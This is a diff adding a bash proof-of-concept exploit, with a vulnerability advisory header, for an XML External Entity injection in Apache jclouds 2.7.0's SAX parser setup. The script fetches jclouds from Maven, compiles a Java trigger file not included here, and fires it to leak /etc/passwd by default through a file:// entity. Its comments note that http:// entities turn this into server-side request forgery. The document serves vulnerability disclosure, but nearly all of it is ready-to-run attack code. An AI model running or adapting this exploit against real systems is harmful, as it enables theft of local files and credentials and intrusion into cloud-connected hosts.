@@ -1,0 +1,79 @@
+#!/usr/bin/env bash
+#
+#
+# Apache jclouds 2.7.0 XML External Entity (XXE) Injection
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://jclouds.apache.org
+# Affected version: 2.7.0
+#
+# Summary: Apache jclouds is an open source multi-cloud toolkit for the Java
+# platform that gives you the freedom to create applications that are portable
+# across clouds while giving you full control to use cloud-specific features.
+# The jclouds API gives you the freedom to use portable abstractions or cloud
+# specific features. jclouds tests support of 30 cloud providers and cloud
+# software stacks including Amazon, Azure, GoGrid, OpenStack, Rackspace, and
+# Google.
+#
+# Desc: Apache jclouds suffers from an XML External Entity (XXE) injection
+# vulnerability in its provider-response parsing. The SAX parser factory built
+# by SaxParserModule is created without disabling document type definitions
+# or external entities, and it is used to parse every provider HTTP response,
+# so when the parsed endpoint is attacker-influenced (a BYO or S3-compatible
+# endpoint, a man-in-the-middle, or a malicious provider) the library can be
+# made to read local files or perform server-side request forgery on the jclouds
+# host.
+#
+# Tested on: Microsoft Windows 10 (x86_64)
+#            OpenJDK Temurin 21.0.6
+#            guice 5.1.0
+#            guava 32.1.3
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6027
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6027
+#
+#
+# 13.08.2026
+#
+
+
+# Usage: TARGET_FILE=/etc/passwd bash jclouds.sh
+set -u
+HERE="$(cd "$(dirname "$0")" && pwd)"
+TARGET_FILE="${TARGET_FILE:-/etc/passwd}"
+case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) SEP=";"; jp(){ cygpath -w "$1"; } ;; *) SEP=":"; jp(){ printf '%s' "$1"; } ;; esac
+command -v javac >/dev/null || { echo "[!] need a JDK (javac)"; exit 1; }
+W="$HERE/jclouds_xxe_build"; rm -rf "$W"; mkdir -p "$W/libs"
+
+M="https://repo1.maven.org/maven2"
+echo "[*] Fetching jclouds-core 2.7.0 + deps ..."
+declare -a JARS=(
+  "org/apache/jclouds/jclouds-core/2.7.0/jclouds-core-2.7.0.jar"
+  "com/google/inject/guice/5.1.0/guice-5.1.0.jar"
+  "com/google/guava/guava/32.1.3-jre/guava-32.1.3-jre.jar"
+  "com/google/guava/failureaccess/1.0.2/failureaccess-1.0.2.jar"
+  "javax/inject/javax.inject/1/javax.inject-1.jar"
+  "aopalliance/aopalliance/1.0/aopalliance-1.0.jar"
+)
+for j in "${JARS[@]}"; do curl -fsSL "$M/$j" -o "$W/libs/$(basename "$j")" || { echo "[!] download failed: $j"; exit 1; }; done
+CP=""; for x in "$W"/libs/*.jar; do CP="${CP:+$CP$SEP}$(jp "$x")"; done
+
+echo "[*] compiling the trigger (reflection-only; no cp needed to compile) ..."
+javac -d "$(jp "$W")" "$(jp "$HERE/JcloudsXxe.java")" || { echo "[!] build failed"; exit 1; }
+
+if [ ! -f "$TARGET_FILE" ]; then
+  TARGET_FILE="$W/secret.txt"; printf 'XXE-LEAKED jclouds secret: aws_key=AKIA_ZSL  db_pass=hunter2\n' > "$TARGET_FILE"
+fi
+
+echo "[*] Firing: real SaxParserModule factory parses a provider response with a file:// external entity"
+echo "-----------------------------------------------------------------"
+java -cp "$(jp "$W")${SEP}$CP" JcloudsXxe "$TARGET_FILE"
+echo "-----------------------------------------------------------------"
+echo "[*] The leaked bytes are the local file jclouds' SAX parser resolved via the external entity."
+echo "    (http:// entities instead of file:// turn this into SSRF from the jclouds host.)"
